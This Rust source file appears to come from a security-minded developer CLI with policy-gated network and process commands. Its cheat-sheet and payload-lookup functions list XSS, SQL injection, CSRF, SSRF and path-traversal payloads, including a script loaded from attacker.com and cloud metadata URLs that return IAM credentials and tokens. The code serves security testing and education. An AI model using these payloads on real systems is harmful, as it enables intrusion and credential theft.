//! Higher-level command surfaces: developer, network, cloud, security,
//! agents, natural-language intent routing, and themes.
//!
//! These commands are real: they inspect the host or project, and any process
//! execution still goes through the execution broker. Network probes require
//! an explicit `--allow` unless policy already grants the target.

use crate::commands;
use crate::context::{audit_path, effective_policy, init_runtime};
use crate::docs_cmd;
use crate::phase3_cmd;
use crate::tools_cmd;
use serde::Serialize;
use serde_json::json;
use std::collections::BTreeSet;
use std::io::{Read, Write};
use std::net::{SocketAddr, TcpStream, ToSocketAddrs};
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};
use z_core::error::{Area, ZenError, ZenResult};

// ---------------------------------------------------------------------------
// shared helpers
// ---------------------------------------------------------------------------

fn cwd() -> PathBuf {
    std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
}

fn root_for(project: &Option<PathBuf>) -> PathBuf {
    project.clone().unwrap_or_else(cwd)
}

fn exists(root: &Path, name: &str) -> bool {
    root.join(name).exists()
}

fn find_in_path(program: &str) -> Option<PathBuf> {
    let path = std::env::var_os("PATH")?;
    for dir in std::env::split_paths(&path) {
        let candidate = dir.join(program);
        if candidate.is_file() {
            return Some(candidate);
        }
        #[cfg(windows)]
        {
            let exe = dir.join(format!("{program}.exe"));
            if exe.is_file() {
                return Some(exe);
            }
        }
    }
    None
}

fn audit(action: &str, resource: &str, decision: &str, result: &str, risk: &str) {
    let Ok(actor) = z_identity::local_user() else {
        return;
    };
    let Ok(path) = audit_path() else {
        return;
    };
    if let Ok(mut log) = z_audit::AuditLog::open(&path) {
        let platform = format!("{}-{}", std::env::consts::OS, std::env::consts::ARCH);
        let _ = log.append(
            &actor.id,
            actor.actor_type.as_str(),
            action,
            resource,
            None,
            decision,
            result,
            risk,
            &platform,
        );
    }
}

/// Check the effective policy for a network action. `allow` is the explicit
/// user override (`--allow`), which is itself audited.
pub(crate) fn require_network(
    project: &Option<PathBuf>,
    target: &str,
    allow: bool,
) -> ZenResult<()> {
    let rt = init_runtime(project.clone())?;
    let policy = effective_policy(&rt)?;
    let actor = z_identity::local_user()?;
    let decision = z_policy::evaluate(
        &policy,
        &z_policy::PolicyRequest {
            actor: actor.id.clone(),
            action: "network.connect".into(),
            resource: target.to_string(),
        },
    );
    let permitted = matches!(decision.decision, z_policy::Decision::Allow);
    if !permitted && !allow {
        return Err(ZenError::new(
            Area::Pol,
            60,
            format!("policy does not allow network access to `{target}`"),
        )
        .with_remediation(
            "Add the target to network.allow in .zentrion/policy.yaml, or pass --allow to approve this one request.",
        ));
    }
    audit(
        "network.connect",
        target,
        if permitted {
            "allow"
        } else {
            "allow(user-approved)"
        },
        "allowed",
        if permitted { "medium" } else { "high" },
    );
    if !permitted {
        println!("  NOTE: --allow approved a target outside policy for this single request.");
    }
    Ok(())
}

/// Gate an explicitly requested child process (for example an MCP server)
/// through the same `process.spawn` policy used by `z run`.
pub(crate) fn require_process(
    project: &Option<PathBuf>,
    program: &str,
    allow: bool,
) -> ZenResult<()> {
    let rt = init_runtime(project.clone())?;
    let policy = effective_policy(&rt)?;
    let actor = z_identity::local_user()?;
    let decision = z_policy::evaluate(
        &policy,
        &z_policy::PolicyRequest {
            actor: actor.id.clone(),
            action: "process.spawn".into(),
            resource: program.to_string(),
        },
    );
    let permitted = matches!(decision.decision, z_policy::Decision::Allow);
    if !permitted && !allow {
        return Err(ZenError::new(
            Area::Pol,
            55,
            format!("policy does not allow starting `{program}`"),
        )
        .with_remediation(
            "Add the program to process.spawn in .zentrion/policy.yaml, or pass --allow for this one request.",
        ));
    }
    audit(
        "process.spawn",
        program,
        if permitted {
            "allow"
        } else {
            "allow(user-approved)"
        },
        "allowed",
        if permitted { "medium" } else { "high" },
    );
    if !permitted {
        println!("  NOTE: --allow approved a process outside policy for this request.");
    }
    Ok(())
}

fn resolve(host: &str, port: u16) -> ZenResult<Vec<SocketAddr>> {
    if host.trim().is_empty() || host.contains(char::is_whitespace) {
        return Err(ZenError::new(Area::Cfg, 61, "invalid host name"));
    }
    let mut addrs: Vec<SocketAddr> = (host, port)
        .to_socket_addrs()
        .map_err(|e| {
            ZenError::new(Area::Net, 62, format!("DNS lookup failed for {host}: {e}"))
                .with_remediation("Check the name and your resolver configuration.")
        })?
        .collect();
    addrs.sort();
    addrs.dedup();
    Ok(addrs)
}

fn parse_range(value: &str) -> ZenResult<Vec<u16>> {
    if let Some((start, end)) = value.split_once('-') {
        let start: u16 = start
            .trim()
            .parse()
            .map_err(|_| ZenError::new(Area::Cfg, 63, format!("invalid port `{start}`")))?;
        let end: u16 = end
            .trim()
            .parse()
            .map_err(|_| ZenError::new(Area::Cfg, 64, format!("invalid port `{end}`")))?;
        if start == 0 || end == 0 || end < start {
            return Err(ZenError::new(Area::Cfg, 65, "invalid port range"));
        }
        if (end - start) as usize > 4096 {
            return Err(ZenError::new(
                Area::Cfg,
                66,
                "range too large (limit 4096 ports per request)",
            ));
        }
        Ok((start..=end).collect())
    } else {
        let port: u16 = value
            .trim()
            .parse()
            .map_err(|_| ZenError::new(Area::Cfg, 67, format!("invalid port `{value}`")))?;
        Ok(vec![port])
    }
}

// ---------------------------------------------------------------------------
// code
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Stack {
    Cargo,
    Node,
    Python,
    Go,
    Make,
}

impl Stack {
    fn name(self) -> &'static str {
        match self {
            Stack::Cargo => "rust (cargo)",
            Stack::Node => "node",
            Stack::Python => "python",
            Stack::Go => "go",
            Stack::Make => "make",
        }
    }

    fn allowed_programs(self) -> &'static [&'static str] {
        match self {
            Stack::Cargo => &["cargo", "rustc", "rustfmt", "cargo-clippy", "git"],
            Stack::Node => &["node", "npm", "npx", "yarn", "pnpm", "git"],
            Stack::Python => &[
                "python", "python3", "pytest", "pip", "pip3", "ruff", "black", "git",
            ],
            Stack::Go => &["go", "gofmt", "git"],
            Stack::Make => &["make", "git"],
        }
    }

    fn command(self, action: &str) -> Option<(&'static str, Vec<&'static str>)> {
        match (self, action) {
            (Stack::Cargo, "build") => Some(("cargo", vec!["build"])),
            (Stack::Cargo, "test") => Some(("cargo", vec!["test"])),
            (Stack::Cargo, "check") => Some(("cargo", vec!["check"])),
            (Stack::Cargo, "fmt") => Some(("cargo", vec!["fmt"])),
            (Stack::Cargo, "lint") => Some(("cargo", vec!["clippy", "--", "-D", "warnings"])),
            (Stack::Cargo, "run") => Some(("cargo", vec!["run"])),
            (Stack::Node, "build") => Some(("npm", vec!["run", "build"])),
            (Stack::Node, "test") => Some(("npm", vec!["test"])),
            (Stack::Node, "check") => Some(("npm", vec!["run", "check"])),
            (Stack::Node, "lint") => Some(("npm", vec!["run", "lint"])),
            (Stack::Node, "fmt") => Some(("npm", vec!["run", "format"])),
            (Stack::Node, "run") => Some(("npm", vec!["start"])),
            (Stack::Python, "test") => Some(("python3", vec!["-m", "pytest"])),
            (Stack::Python, "build") => Some(("python3", vec!["-m", "build"])),
            (Stack::Python, "check") => Some(("python3", vec!["-m", "compileall", "."])),
            (Stack::Python, "lint") => Some(("ruff", vec!["check", "."])),
            (Stack::Python, "fmt") => Some(("black", vec!["."])),
            (Stack::Python, "run") => Some(("python3", vec!["-m", "pytest"])),
            (Stack::Go, "test") => Some(("go", vec!["test", "./..."])),
            (Stack::Go, "build") => Some(("go", vec!["build", "./..."])),
            (Stack::Go, "check") => Some(("go", vec!["vet", "./..."])),
            (Stack::Go, "fmt") => Some(("gofmt", vec!["-w", "."])),
            (Stack::Go, "lint") => Some(("go", vec!["vet", "./..."])),
            (Stack::Go, "run") => Some(("go", vec!["run", "."])),
            (Stack::Make, "test") => Some(("make", vec!["test"])),
            (Stack::Make, "build") => Some(("make", vec!["build"])),
            (Stack::Make, "check") => Some(("make", vec!["check"])),
            (Stack::Make, "fmt") => Some(("make", vec!["fmt"])),
            (Stack::Make, "lint") => Some(("make", vec!["lint"])),
            (Stack::Make, "run") => Some(("make", vec!["run"])),
            _ => None,
        }
    }
}

fn detect_stack(root: &Path) -> Vec<Stack> {
    let mut stacks = Vec::new();
    if exists(root, "Cargo.toml") {
        stacks.push(Stack::Cargo);
    }
    if exists(root, "package.json") {
        stacks.push(Stack::Node);
    }
    if exists(root, "pyproject.toml")
        || exists(root, "setup.py")
        || exists(root, "requirements.txt")
    {
        stacks.push(Stack::Python);
    }
    if exists(root, "go.mod") {
        stacks.push(Stack::Go);
    }
    if exists(root, "Makefile") || exists(root, "makefile") {
        stacks.push(Stack::Make);
    }
    stacks
}

fn git_branch(root: &Path) -> Option<String> {
    let head = std::fs::read_to_string(root.join(".git/HEAD")).ok()?;
    let head = head.trim();
    head.strip_prefix("ref: refs/heads/")
        .map(|branch| branch.to_string())
        .or_else(|| Some(format!("detached {}", &head[..head.len().min(12)])))
}

pub fn code(args: &[String], project: Option<PathBuf>, json_out: bool) -> ZenResult<()> {
    let action = args.first().map(|s| s.as_str()).unwrap_or("status");
    let root = root_for(&project);
    let stacks = detect_stack(&root);

    match action {
        "status" | "info" => {
            let branch = git_branch(&root);
            let files = count_source_files(&root);
            if json_out {
                let stacks_json: Vec<_> = stacks
                    .iter()
                    .map(|stack| {
                        let mut commands = serde_json::Map::new();
                        for action in ["build", "test", "check", "fmt", "lint", "run"] {
                            if let Some((program, args)) = stack.command(action) {
                                commands.insert(
                                    action.to_string(),
                                    json!(format!("{} {}", program, args.join(" "))),
                                );
                            }
                        }
                        json!({
                            "stack": stack.name(),
                            "available": stack.allowed_programs().iter().find(|p| find_in_path(p).is_some()),
                            "commands": commands,
                        })
                    })
                    .collect();
                println!(
                    "{}",
                    serde_json::to_string_pretty(&json!({
                        "root": root.display().to_string(),
                        "git_branch": branch,
                        "source_files": files,
                        "stacks": stacks_json,
                        "policy": "run commands through the broker with `z code <action>`",
                    }))?
                );
            } else {
                println!("Zentrion code");
                println!("  root:      {}", root.display());
                println!(
                    "  git:       {}",
                    branch.as_deref().unwrap_or("not a repository")
                );
                println!("  source:    {} files", files);
                if stacks.is_empty() {
                    println!("  stack:     not detected (looked for Cargo.toml, package.json, pyproject.toml, go.mod, Makefile)");
                } else {
                    for stack in &stacks {
                        println!("  stack:     {}", stack.name());
                        for action in ["build", "test", "check", "fmt", "lint", "run"] {
                            if let Some((program, args)) = stack.command(action) {
                                let installed = find_in_path(program).is_some();
                                println!(
                                    "    {:<6} {} {}{}",
                                    action,
                                    program,
                                    args.join(" "),
                                    if installed { "" } else { "  (not installed)" }
                                );
                            }
                        }
                    }
                }
                println!();
                println!("  z code test          run through the broker");
                println!("  z code allow         show how to allow this toolchain in policy");
                println!("  z code exec <cmd>    execute an explicit program through the broker");
            }
            Ok(())
        }
        "allow" | "policy" => code_allow(&root, &stacks, json_out),
        "exec" => {
            let Some(program) = args.get(1) else {
                return Err(ZenError::new(
                    Area::Cfg,
                    68,
                    "usage: z code exec <program> [args...]",
                ));
            };
            let rest: Vec<String> = args.iter().skip(2).cloned().collect();
            let approve = rest.iter().any(|a| a == "--approve");
            let rest: Vec<String> = rest.into_iter().filter(|a| a != "--approve").collect();
            commands::run(program.clone(), rest, approve, project, json_out)
        }
        action @ ("build" | "test" | "check" | "fmt" | "lint" | "run") => {
            let extra: Vec<String> = args
                .iter()
                .skip(1)
                .filter(|arg| arg.as_str() != "--approve")
                .cloned()
                .collect();
            let approve = args.iter().any(|arg| arg == "--approve");
            let Some(stack) = stacks.first().copied() else {
                return Err(ZenError::new(
                    Area::Cfg,
                    69,
                    format!(
                        "cannot detect a project toolchain in {}",
                        root.display()
                    ),
                )
                .with_remediation(
                    "Run this inside a Rust, Node, Python, Go or Make project, or use `z code exec`.",
                ));
            };
            let Some((program, base_args)) = stack.command(action) else {
                return Err(ZenError::new(
                    Area::Cfg,
                    70,
                    format!("`{}` is not supported for {}", action, stack.name()),
                )
                .with_remediation("Run `z code status` to see supported actions."));
            };
            let mut final_args: Vec<String> = base_args.iter().map(|s| s.to_string()).collect();
            final_args.extend(extra);
            println!(
                "Running through the broker: {} {}",
                program,
                final_args.join(" ")
            );
            commands::run(program.to_string(), final_args, approve, project, json_out)
        }
        other => Err(
            ZenError::new(Area::Cfg, 71, format!("unknown code subcommand `{other}`"))
                .with_remediation(
                    "Usage: z code [status|build|test|check|fmt|lint|run|allow|exec]",
                ),
        ),
    }
}

fn count_source_files(root: &Path) -> usize {
    const SKIP: &[&str] = &[
        ".git",
        "target",
        "node_modules",
        ".cargo-home",
        ".pydeps",
        "dist",
        "build",
        ".venv",
        "venv",
        ".kilo",
        ".zt-test",
        ".pydeps",
        ".cargo-home",
    ];
    let mut count = 0;
    let mut stack = vec![root.to_path_buf()];
    let mut visited = 0;
    while let Some(dir) = stack.pop() {
        visited += 1;
        if visited > 5000 {
            break;
        }
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let name = entry.file_name();
            let name = name.to_string_lossy();
            if entry
                .file_type()
                .map(|kind| kind.is_symlink())
                .unwrap_or(false)
            {
                continue;
            }
            if path.is_dir() {
                if !SKIP.contains(&name.as_ref()) {
                    stack.push(path);
                }
            } else if is_source(path.extension().and_then(|e| e.to_str())) {
                count += 1;
            }
        }
    }
    count
}

fn is_source(ext: Option<&str>) -> bool {
    matches!(
        ext,
        Some(
            "rs" | "ts"
                | "tsx"
                | "js"
                | "jsx"
                | "py"
                | "go"
                | "c"
                | "h"
                | "cc"
                | "cpp"
                | "hpp"
                | "java"
                | "kt"
                | "swift"
                | "rb"
                | "php"
                | "cs"
                | "sh"
                | "bash"
                | "zsh"
                | "toml"
                | "yaml"
                | "yml"
                | "json"
                | "md"
        )
    )
}

fn code_allow(root: &Path, stacks: &[Stack], json_out: bool) -> ZenResult<()> {
    let marker = root.join(".zentrion");
    if !marker.is_dir() {
        return Err(ZenError::new(
            Area::Cfg,
            72,
            format!("{} is not a Zentrion project", root.display()),
        )
        .with_remediation("Run `z init` first; policy changes are project-scoped."));
    }
    if stacks.is_empty() {
        return Err(ZenError::new(
            Area::Cfg,
            73,
            "no supported toolchain detected, nothing to allow",
        ));
    }
    let policy_path = marker.join("policy.yaml");
    let mut policy = if policy_path.exists() {
        let text = z_core::fs::read_text(&policy_path)?;
        z_policy::parse_policy(&text)?
    } else {
        z_policy::Policy::default()
    };
    let mut programs = BTreeSet::new();
    for stack in stacks {
        for program in stack.allowed_programs() {
            programs.insert(program.to_string());
        }
    }
    for program in &programs {
        if !policy.process.spawn.iter().any(|p| p == program) {
            policy.process.spawn.push(program.clone());
        }
    }
    if policy.filesystem.read.is_empty() {
        policy.filesystem.read.push("./**".into());
    }
    if policy.filesystem.write.is_empty() {
        policy.filesystem.write.push("./**".into());
    }
    let text = serde_yaml::to_string(&policy)?;
    z_core::fs::write_text(&policy_path, &text)?;

    audit(
        "policy.write",
        &policy_path.display().to_string(),
        "allow",
        "user-approved",
        "high",
    );

    if json_out {
        println!(
            "{}",
            serde_json::to_string_pretty(&json!({
                "policy": policy_path.display().to_string(),
                "process_spawn": policy.process.spawn,
                "note": "explicit developer toolchain allowlist; review before committing",
            }))?
        );
    } else {
        println!("Updated {}", policy_path.display());
        println!(
            "  process.spawn now allows: {}",
            policy.process.spawn.join(", ")
        );
        println!();
        println!(
            "This is an explicit, project-scoped grant. Review the file before committing it."
        );
        println!("Run `z audit tail` to see the change.");
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// security
// ---------------------------------------------------------------------------

pub fn security(args: &[String], project: Option<PathBuf>, json_out: bool) -> ZenResult<()> {
    let sub = args.first().map(|s| s.as_str()).unwrap_or("posture");
    match sub {
        "scan" => phase3_cmd::scan(&args[1..], json_out, project),
        "findings" | "finding" => phase3_cmd::finding(&["list".to_string()], json_out),
        "report" => phase3_cmd::report(&["latest".to_string()], json_out),
        "assets" | "asset" => phase3_cmd::asset(&["list".to_string()], json_out),
        "sbom" => phase3_cmd::sbom(json_out),
        "secrets" => scan_secrets(&root_for(&project), json_out),
        "sast" => scan_sast(&root_for(&project), json_out),
        "cheatsheet" | "cheat" => security_cheatsheet(args.get(1).map(|s| s.as_str()), json_out),
        "payload" | "payloads" => {
            let cat = args.get(1).map(|s| s.as_str()).unwrap_or("list");
            let filter = args.get(2).map(|s| s.as_str());
            security_payload(cat, filter, json_out)
        }
        "headers" | "header" => {
            let url = args.get(1).ok_or_else(|| {
                ZenError::new(Area::Sec, 150, "usage: z security headers <url>")
            })?;
            test_security_headers(url, json_out)
        }
        "posture" | "status" | "audit" => security_posture(project, json_out),
        other => Err(ZenError::new(
            Area::Cfg,
            74,
            format!("unknown security subcommand `{other}`"),
        )
        .with_remediation(
            "Usage: z security [posture|scan|findings|report|assets|sbom|secrets|sast|cheatsheet|payload|headers]",
        )),
    }
}

fn security_posture(project: Option<PathBuf>, json_out: bool) -> ZenResult<()> {
    let rt = init_runtime(project.clone())?;
    let policy = effective_policy(&rt)?;
    let audit_file = audit_path()?;
    let verified = z_audit::verify(&audit_file).unwrap_or(Ok(0));
    let events = z_audit::read_events(&audit_file)
        .map(|e| e.len())
        .unwrap_or(0);
    let latest = z_native::phase3::load_report().ok();

    let out = json!({
        "policy": {
            "name": policy.metadata.name,
            "filesystem_read": policy.filesystem.read,
            "filesystem_write": policy.filesystem.write,
            "network_allow": policy.network.allow,
            "process_spawn": policy.process.spawn,
            "secrets": policy.secrets.read,
            "admin": policy.system.admin,
        },
        "audit": {
            "events": events,
            "chain": match verified { Ok(n) => json!({"status":"verified","events":n}), Err(n) => json!({"status":"tampered","at":n}) },
        },
        "latest_scan": latest.as_ref().map(|r| json!({
            "target": r.target,
            "findings": r.findings.len(),
            "high_critical": r.findings.iter().filter(|f| matches!(f.severity, z_native::phase3::Severity::High | z_native::phase3::Severity::Critical)).count(),
        })),
        "project": rt.project.as_ref().map(|p| p.root.display().to_string()),
    });

    if json_out {
        println!("{}", serde_json::to_string_pretty(&out)?);
        return Ok(());
    }
    println!("ZENTRION security posture");
    println!("  policy:      {}", policy.metadata.name);
    println!("  read:        {:?}", policy.filesystem.read);
    println!("  write:       {:?}", policy.filesystem.write);
    println!("  network:     {:?}", policy.network.allow);
    println!("  process:     {:?}", policy.process.spawn);
    println!("  secrets:     {}", policy.secrets.read);
    println!("  admin:       {}", policy.system.admin);
    match verified {
        Ok(n) => println!("  audit:       verified ({n} events)"),
        Err(at) => println!("  audit:       CHAIN BROKEN near event {at}"),
    }
    match latest {
        Some(report) => {
            let high = report
                .findings
                .iter()
                .filter(|f| {
                    matches!(
                        f.severity,
                        z_native::phase3::Severity::High | z_native::phase3::Severity::Critical
                    )
                })
                .count();
            println!(
                "  last scan:   {} ({} findings, {} high/critical)",
                report.target,
                report.findings.len(),
                high
            );
        }
        None => println!("  last scan:   none (run `z security scan .`)"),
    }
    Ok(())
}

fn security_cheatsheet(topic: Option<&str>, json_out: bool) -> ZenResult<()> {
    struct Cheat {
        topic: &'static str,
        title: &'static str,
        description: &'static str,
        vectors: &'static [&'static str],
        defense: &'static str,
    }

    let cheats = [
        Cheat {
            topic: "xss",
            title: "Cross-Site Scripting (XSS)",
            description: "Injection of client-side scripts into web applications viewed by other users.",
            vectors: &[
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(1)",
                "\"><script src=//attacker.com/xss.js></script>",
                "'-alert(1)-'",
            ],
            defense: "Context-aware HTML/JS/CSS entity encoding, Content-Security-Policy (CSP) with nonces, HttpOnly cookies.",
        },
        Cheat {
            topic: "sqli",
            title: "SQL Injection (SQLi)",
            description: "Interference with database queries via unescaped SQL fragments.",
            vectors: &[
                "' OR '1'='1' --",
                "admin' --",
                "' UNION SELECT null, username, password FROM users --",
                "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a) --",
                "'; WAITFOR DELAY '0:0:5' --",
                "' OR 1=1 AND pg_sleep(5) --",
            ],
            defense: "Parameterized queries / prepared statements (never string format), ORMs with parameter binding, principle of least privilege DB user.",
        },
        Cheat {
            topic: "csrf",
            title: "Cross-Site Request Forgery (CSRF)",
            description: "Forcing authenticated end users to execute unwanted state-changing actions.",
            vectors: &[
                "<form action=\"https://target.com/api/transfer\" method=\"POST\"><input type=\"hidden\" name=\"amount\" value=\"1000\"/><input type=\"hidden\" name=\"to\" value=\"attacker\"/></form><script>document.forms[0].submit()</script>",
                "Fetch API / XMLHttpRequest without anti-CSRF token on CORS-enabled endpoints",
            ],
            defense: "Anti-CSRF tokens (synchronizer token or double submit cookie), SameSite=Strict or SameSite=Lax cookie attribute, custom headers (X-Requested-With).",
        },
        Cheat {
            topic: "ssrf",
            title: "Server-Side Request Forgery (SSRF)",
            description: "Abusing server functionality to read or update internal resources via manipulated URLs.",
            vectors: &[
                "http://169.254.169.254/latest/meta-data/ (AWS IMDSv1)",
                "http://metadata.google.internal/computeMetadata/v1/ (GCP)",
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Azure)",
                "http://127.0.0.1:8080/admin",
                "http://localhost:2375/v1.24/containers/json (Docker socket)",
            ],
            defense: "Enforce IMDSv2 (token-based), outbound network firewall / egress filtering, validate & canonicalize URLs against a strict allowlist (block RFC1918 private IPs).",
        },
        Cheat {
            topic: "lfi",
            title: "Local File Inclusion / Path Traversal",
            description: "Accessing unauthorized files on the server file system through user-controlled path parameters.",
            vectors: &[
                "../../../../etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd (double encode)",
                "php://filter/convert.base64-encode/resource=config.php",
                "/var/log/apache2/access.log (log poisoning)",
            ],
            defense: "Use whitelist of allowed filenames or IDs; reject path separators (/ and \\); canonicalize paths and verify prefix against allowed root directory.",
        },
        Cheat {
            topic: "headers",
            title: "HTTP Security Headers",
            description: "Browser directives hardening web apps against clickjacking, sniffing, and XSS.",
            vectors: &[
                "Strict-Transport-Security: max-age=63072000; includeSubDomains; preload",
                "Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';",
                "X-Frame-Options: DENY",
                "X-Content-Type-Options: nosniff",
                "Referrer-Policy: strict-origin-when-cross-origin",
                "Permissions-Policy: camera=(), microphone=(), geolocation=()",
            ],
            defense: "Configure web servers (Nginx, Caddy, Cloudflare) and reverse proxies to emit all 6 core security headers.",
        },
        Cheat {
            topic: "recon",
            title: "Reconnaissance & Network Discovery",
            description: "Essential reconnaissance commands for target mapping.",
            vectors: &[
                "z network dns <domain> --allow",
                "z network ports <domain> 1-1024 --allow",
                "nmap -sS -T4 -p- -sV <target>",
                "dig +nocmd <domain> any +multiline +noall +answer",
                "curl -I -s -L https://<domain>",
            ],
            defense: "Minimize exposed attack surface; disable unnecessary services; deploy WAF and rate limiting.",
        },
    ];

    if let Some(target) = topic {
        let t = target.to_lowercase();
        let matched = cheats
            .iter()
            .find(|c| c.topic == t || c.title.to_lowercase().contains(&t));
        if let Some(c) = matched {
            if json_out {
                println!(
                    "{}",
                    serde_json::to_string_pretty(&json!({
                        "topic": c.topic,
                        "title": c.title,
                        "description": c.description,
                        "vectors": c.vectors,
                        "defense": c.defense,
                    }))?
                );
            } else {
                println!("=== {} [{}] ===", c.title, c.topic);
                println!("Description: {}", c.description);
                println!("\nTest Vectors / Payloads:");
                for v in c.vectors {
                    println!("  • {v}");
                }
                println!("\nRemediation & Defense:");
                println!("  {}", c.defense);
            }
            return Ok(());
        } else {
            return Err(ZenError::new(
                Area::Sec,
                151,
                format!("unknown cheat sheet topic '{target}'"),
            )
            .with_remediation("Available topics: xss, sqli, csrf, ssrf, lfi, headers, recon"));
        }
    }

    if json_out {
        let list: Vec<_> = cheats
            .iter()
            .map(|c| {
                json!({
                    "topic": c.topic,
                    "title": c.title,
                    "description": c.description,
                    "sample_vector": c.vectors.first().unwrap_or(&""),
                })
            })
            .collect();
        println!("{}", serde_json::to_string_pretty(&list)?);
    } else {
        println!("ZENTRION Threat-Aware Security Cheat Sheets");
        println!("{:<10} {:<32} DESCRIPTION", "TOPIC", "TITLE");
        for c in &cheats {
            println!("{:<10} {:<32} {}", c.topic, c.title, c.description);
        }
        println!("\nView topic: z security cheatsheet <topic>  (e.g. z security cheatsheet xss)");
    }
    Ok(())
}

fn security_payload(category: &str, filter: Option<&str>, json_out: bool) -> ZenResult<()> {
    struct PayloadItem {
        category: &'static str,
        name: &'static str,
        payload: &'static str,
        context: &'static str,
    }

    let items = [
        // XSS
        PayloadItem { category: "xss", name: "Standard Script", payload: "<script>alert(1)</script>", context: "Basic HTML injection without sanitization" },
        PayloadItem { category: "xss", name: "Image OnError", payload: "<img src=x onerror=alert(1)>", context: "Tags where src fails, firing JavaScript handler" },
        PayloadItem { category: "xss", name: "SVG OnLoad", payload: "<svg onload=alert(1)>", context: "SVG context vector, bypasses many regex filters" },
        PayloadItem { category: "xss", name: "Body OnLoad", payload: "<body onload=alert(1)>", context: "Useful when tags inside body are stripped" },
        PayloadItem { category: "xss", name: "Javascript URI", payload: "javascript:alert(1)", context: "A/HREF or IFRAME/SRC attributes" },
        PayloadItem { category: "xss", name: "Template Literal", payload: "${alert(1)}", context: "ES6 template strings inside client-side templates" },
        PayloadItem { category: "xss", name: "Universal Polyglot", payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", context: "Polyglot execution across HTML, script, attribute, and SVG contexts" },
        // SQLi
        PayloadItem { category: "sqli", name: "Auth Bypass Tautology", payload: "' OR '1'='1' --", context: "Bypasses WHERE username='' password='' checks" },
        PayloadItem { category: "sqli", name: "Numeric Tautology", payload: "1 OR 1=1", context: "Numeric unquoted parameters (e.g. id=1)" },
        PayloadItem { category: "sqli", name: "Union Schema Extraction", payload: "' UNION SELECT 1, table_name, 3 FROM information_schema.tables --", context: "Extracts table names in MySQL/PostgreSQL" },
        PayloadItem { category: "sqli", name: "Time Blind MySQL", payload: "' OR IF(1=1, SLEEP(5), 0) --", context: "Confirms blind SQLi via 5-second response delay" },
        PayloadItem { category: "sqli", name: "Time Blind PostgreSQL", payload: "'; SELECT pg_sleep(5); --", context: "PostgreSQL stacked query sleep verification" },
        PayloadItem { category: "sqli", name: "Time Blind MSSQL", payload: "'; WAITFOR DELAY '0:0:5'; --", context: "MSSQL time-based blind injection" },
        PayloadItem { category: "sqli", name: "Error-Based XPath", payload: "' AND extractvalue(1, concat(0x7e, (SELECT user()))) --", context: "Extracts user in database error message" },
        // CSRF
        PayloadItem { category: "csrf", name: "POST Form PoC", payload: "<html><body><form action=\"https://TARGET/api/update\" method=\"POST\"><input type=\"hidden\" name=\"email\" value=\"attacker@owned.com\"/><input type=\"submit\" value=\"Submit\"/></form><script>document.forms[0].submit()</script></body></html>", context: "Auto-submitting HTML form simulating CSRF attack" },
        PayloadItem { category: "csrf", name: "JSON CSRF Flash/Blob", payload: "<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://TARGET/api/action',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','text/plain');xhr.send('{\"action\":\"transfer\"}');</script>", context: "Content-Type spoofing against misconfigured parsers" },
        // SSRF
        PayloadItem { category: "ssrf", name: "AWS EC2 IMDSv1", payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", context: "Dumps IAM role credentials on AWS EC2 instances" },
        PayloadItem { category: "ssrf", name: "GCP Metadata", payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", context: "Requires Metadata-Flavor: Google header" },
        PayloadItem { category: "ssrf", name: "Azure Instance Metadata", payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", context: "Requires Metadata: true header" },
        PayloadItem { category: "ssrf", name: "Kubernetes Service Account", payload: "https://kubernetes.default.svc/var/run/secrets/kubernetes.io/serviceaccount/token", context: "Reads pod service account JWT token" },
        PayloadItem { category: "ssrf", name: "Localhost Loopback", payload: "http://127.0.0.1:8080/metrics", context: "Probes internal microservices not exposed to internet" },
        // LFI
        PayloadItem { category: "lfi", name: "UNIX Passwd Traversal", payload: "../../../../etc/passwd", context: "Standard path traversal checking user accounts" },
        PayloadItem { category: "lfi", name: "URL Encoded Traversal", payload: "..%2f..%2f..%2f..%2fetc%2fpasswd", context: "Bypasses naive string match for ../" },
        PayloadItem { category: "lfi", name: "Double URL Encoded", payload: "..%252f..%252f..%252fetc%252fpasswd", context: "Bypasses double-decoding application gateways" },
        PayloadItem { category: "lfi", name: "PHP Filter Base64", payload: "php://filter/convert.base64-encode/resource=index.php", context: "Reads source code without executing PHP script" },
    ];

    let cat_lower = category.to_lowercase();
    if cat_lower == "list" {
        let cats = ["xss", "sqli", "csrf", "ssrf", "lfi"];
        if json_out {
            println!("{}", serde_json::to_string_pretty(&cats)?);
        } else {
            println!("ZENTRION Security Payload Lookup");
            println!("Available categories: xss, sqli, csrf, ssrf, lfi");
            println!("Usage: z security payload <category> [filter]");
            println!("Example: z security payload sqli union");
        }
        return Ok(());
    }

    let mut filtered: Vec<&PayloadItem> =
        items.iter().filter(|i| i.category == cat_lower).collect();
    if let Some(f) = filter {
        let fl = f.to_lowercase();
        filtered.retain(|i| {
            i.name.to_lowercase().contains(&fl)
                || i.payload.to_lowercase().contains(&fl)
                || i.context.to_lowercase().contains(&fl)
        });
    }

    if filtered.is_empty() {
        return Err(ZenError::new(
            Area::Sec,
            152,
            format!("no payloads found for category '{category}'"),
        )
        .with_remediation("Available categories: xss, sqli, csrf, ssrf, lfi"));
    }

    if json_out {
        let out: Vec<_> = filtered
            .iter()
            .map(|i| {
                json!({
                    "category": i.category,
                    "name": i.name,
                    "payload": i.payload,
                    "context": i.context,
                })
            })
            .collect();
